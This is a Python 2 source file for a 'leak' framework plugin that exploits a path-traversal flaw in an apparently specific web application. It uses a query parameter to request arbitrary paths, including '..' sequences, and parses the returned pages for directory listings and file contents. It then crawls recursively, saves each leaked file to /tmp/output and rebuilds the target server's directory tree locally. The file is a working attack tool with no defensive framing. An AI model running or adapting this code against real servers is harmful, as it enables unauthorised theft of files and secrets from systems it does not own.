#!/usr/bin/env python
# encoding: utf-8
from lxml import etree
import os
import re
import subprocess
import sys
import requests
import urllib
from leak.base import Leaker, Parser, LeakerEOS
import xml.etree.ElementTree as ET

import logging


logger = logging.getLogger(__name__)

FILE = 1
DIR  = 2

class MaraboutParser(Parser):
    def get_patterns(self):
        return [
            # we need first DIR otherwise FILE matches it equally
            (DIR,  r'<h2>Annonces</h2>(<ul>.*</ul>).*</div> <!-- end main -->'),
            (FILE, r'<h2>Annonces</h2>(.*)</div> <!-- end main -->'),
        ]

    def extract_filenames(self, data):
        '''Extract from <li>s'''

        parser = etree.XMLParser(recover=True)

        root = ET.fromstring(data, parser=parser)

        return [_ for _ in root.iter('a')]

    def get_leak(self, data):
        patterns = self.get_patterns()

        for kind, pattern in self.get_patterns():
            p = re.compile(pattern, re.DOTALL|re.M)

            leak = None

            finding = p.findall(data)

            if len(finding) == 0:
                continue

            data = finding[0]

            if kind == DIR:
                return (kind, self.extract_filenames(data))
            else:
                return (kind, data)

        return leak

WAITING  = 0
EXPLORED = 1
ERROR    = 2


class MaraboutLeaker(Leaker):
    def __init__(self, url, cookies={}, params={}, **kwargs):
        super(MaraboutLeaker, self).__init__(parser=MaraboutParser(), **kwargs)

        self.url     = url
        self.cookies = cookies
        self.params  = params

        self.filesystem = {os.path.normpath(params['a']): WAITING}
        self.paths      = [params['a']]
        self.finished = False

        self.output_dir = '/tmp/output/'

        if not os.path.exists(self.output_dir):
            logger.info('creating outout dir %s' % self.output_dir)
            os.mkdir(self.output_dir)

    def _path_from_output_dir(self, path):
        return os.path.join(self.output_dir, path)

    def has_finished(self):
        return self.finished

    def get_next_input_parameter(self):
        if len(self.paths) == 0:
            raise LeakerEOS('No more paths')

        return self.paths.pop(0)

    def input(self):
        self.params.update({'a': self.get_next_input_parameter()})
        response = requests.get(self.url, params=self.params, cookies=self.cookies)

        return response.text

    def update(self, leak_representation):
        '''Update the filesystem representation'''
        kind = leak_representation[0]
        filepath = self.params['a']

        self.filesystem[os.path.normpath(filepath)] = EXPLORED

        contents = leak_representation[1]

        if kind == DIR:
            # add the paths just found to the list avoiding the one already in
            # using for the normalized path in the dictionary
            paths = [os.path.join(filepath , _.text) for _ in leak_representation[1]]
            contents = filter(lambda x: not self.filesystem.has_key(os.path.normpath(x)), paths)
            self.paths += contents

        return (kind, filepath, contents)

    def output(self, leak_representation):
        # when we found file contents we save it in a file that has as name the path urlencoded
        kind, filename, content = leak_representation
        if kind == FILE:
            tmpfilepath = os.path.join(self.output_dir, urllib.quote_plus(os.path.normpath(filename)))
            with open(tmpfilepath, "w+b") as f:
                f.write(content.encode('utf-8'))

        print filename

    def on_exit(self):
        print self.filesystem
        # find out how many '..' are present
        paths = self.filesystem.keys()

        how_deep_is = max([len(filter(lambda x: x == '..', _.split('/'))) for _ in paths])

        dir_path = ''
        for _ in xrange(how_deep_is):
            actual_path = os.path.join(dir_path, chr(ord('a') + _))
            abs_path = self._path_from_output_dir(actual_path)
            if not os.path.exists(abs_path):
                os.mkdir(abs_path)

            dir_path = actual_path

        # now dir_path is the directory from which we start to reconstruct the tree
        abs_dir_path = self._path_from_output_dir(dir_path)

        # retrieve the file from the output dir
        root, dirs, files = os.walk(self.output_dir).next()

        #import ipdb;ipdb.set_trace()

        for filepath in files:
            real_path = os.path.abspath(os.path.join(abs_dir_path, urllib.unquote_plus(filepath)))
            # avoid to act on directory (maybe remove it)
            if os.path.isdir(real_path):
                continue

            containing_dir = os.path.dirname(real_path)
            if not os.path.exists(containing_dir):
                os.makedirs(containing_dir)

            src = self._path_from_output_dir(filepath)
            print '%s -> %s' % (src, real_path)
            os.rename(src, real_path)
